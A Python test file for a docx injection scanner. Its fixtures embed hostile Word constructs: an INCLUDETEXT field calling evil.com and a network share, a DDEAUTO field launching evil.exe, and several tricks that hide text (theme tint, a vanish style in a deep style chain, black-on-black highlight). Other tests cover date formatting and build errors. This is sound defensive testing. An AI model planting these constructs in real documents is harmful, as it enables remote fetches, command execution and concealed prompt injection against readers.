# SPDX-License-Identifier: Apache-2.0
# Copyright (c) 2026 lnfnt <lnfnt@proton.me>

"""Аудит w2 (agent-profile 02.11) — cement-пробы находок F-01..F-07.

Каждая проба построена по воспроизведению из REVIEW-PROF-REALTOR.md:
до фикса findings был пуст (обход), после — находка.
"""
from __future__ import annotations

import io
import tempfile
import zipfile

from docx_cli.builder import build_document
from docx_cli.inject_scan import scan_all
from docx_cli.md_engine import markdown_to_spec
from docx_cli.md_court import build_md_document, _is_date_line

W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"


def _mk_docx(document_xml: str, styles_xml: str | None = None) -> bytes:
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w") as zf:
        zf.writestr("[Content_Types].xml", """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>""")
        zf.writestr("_rels/.rels", """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>""")
        zf.writestr("word/document.xml", document_xml)
        if styles_xml:
            zf.writestr("word/styles.xml", styles_xml)
    return bio.getvalue()


def _scan(document_xml: str, styles_xml: str | None = None) -> list:
    data = _mk_docx(document_xml, styles_xml)
    with tempfile.NamedTemporaryFile(suffix=".docx", delete=False) as tmp:
        tmp.write(data)
        tmp.flush()
        return scan_all(tmp.name)["findings"]


def test_f01_includetext_without_quotes_detected():
    doc = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="{W}"><w:body>
<w:p><w:fldSimple w:instr="INCLUDETEXT http://evil.com/leak.docx"><w:t>x</w:t></w:fldSimple></w:p>
<w:p><w:fldSimple w:instr="INCLUDETEXT \\\\10.0.0.1\\\\share\\\\doc.docx"><w:t>y</w:t></w:fldSimple></w:p>
</w:body></w:document>"""
    findings = _scan(doc)
    inc = [f for f in findings if f["type"] == "include_text_external"]
    assert len(inc) == 2, findings


def test_f02_instrtext_outside_paragraph_detected():
    doc = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="{W}"><w:body>
<w:sdt><w:sdtContent>
<w:r><w:fldChar w:fldCharType="begin"/></w:r>
<w:r><w:instrText>DDEAUTO evil.exe</w:instrText></w:r>
<w:r><w:fldChar w:fldCharType="separate"/></w:r>
<w:r><w:t>Click</w:t></w:r>
<w:r><w:fldChar w:fldCharType="end"/></w:r>
</w:sdtContent></w:sdt>
</w:body></w:document>"""
    findings = _scan(doc)
    assert any(f["type"] == "dde_auto" for f in findings), findings


def test_f03_theme_tint_ff_on_dark_theme_detected():
    doc = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="{W}"><w:body>
<w:p><w:r><w:rPr><w:color w:themeColor="text1" w:themeTint="FF"/></w:rPr>
<w:t>Invisible text via themeTint FF on text1</w:t></w:r></w:p>
</w:body></w:document>"""
    findings = _scan(doc)
    assert any(f["type"] == "theme_tint_invisible" for f in findings), findings


def test_f04_deep_style_chain_vanish_detected():
    styles = f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?><w:styles xmlns:w="{W}">'
    for i in range(1, 10):
        bo = f'<w:basedOn w:val="S{i+1}"/>' if i < 9 else "<w:rPr><w:vanish/></w:rPr>"
        styles += f'<w:style w:type="paragraph" w:styleId="S{i}">{bo}</w:style>'
    styles += "</w:styles>"
    doc = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="{W}"><w:body>
<w:p><w:pPr><w:pStyle w:val="S1"/></w:pPr>
<w:r><w:t>Deeply nested hidden text</w:t></w:r></w:p>
</w:body></w:document>"""
    findings = _scan(doc, styles)
    assert any(f["type"] == "hidden_text_vanish" for f in findings), findings


def test_f05_color_equals_highlight_detected():
    doc = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="{W}"><w:body>
<w:p><w:r><w:rPr><w:color w:val="000000"/><w:highlight w:val="black"/></w:rPr>
<w:t>Black on black highlight invisible payload</w:t></w:r></w:p>
</w:body></w:document>"""
    findings = _scan(doc)
    assert any(f["type"] == "highlight_color_match" for f in findings), findings


def test_f06_numeric_date_not_listed():
    assert _is_date_line("1.1.2020 стороны заключили соглашение.")
    assert _is_date_line("01.02.2021 ответчик перечислил аванс.")
    md_text = """В Тверской районный суд города Москвы
Истец: Иванов И.И.

ИСКОВОЕ ЗАЯВЛЕНИЕ
о взыскании

1.1.2020 стороны заключили соглашение.
1.2.2021 ответчик перечислил аванс.
"""
    doc = build_md_document(md_text, "colleague")
    for i, p in enumerate(doc.paragraphs[4:], start=4):
        li = p.paragraph_format.left_indent
        fi = p.paragraph_format.first_line_indent
        # даты не должны получать hanging-indent подпункта (left=1.25см, first=-0.75см)
        assert li is None or li < 400000, f"P{i} left={li} text={p.text}"
        assert fi is None or fi >= 0, f"P{i} first={fi} text={p.text}"


def test_f07_build_error_returns_envelope(tmp_path):
    spec = markdown_to_spec("# Title\n\n![img](/tmp/nonexistent_123.png)", "/tmp/out.docx", "lex")
    res = build_document(spec, str(tmp_path / "out.docx"))
    assert res["ok"] is False
    assert res["status"] == "error"
    assert "build_failed" in res["reason"]
    assert "not found" in res["reason"]
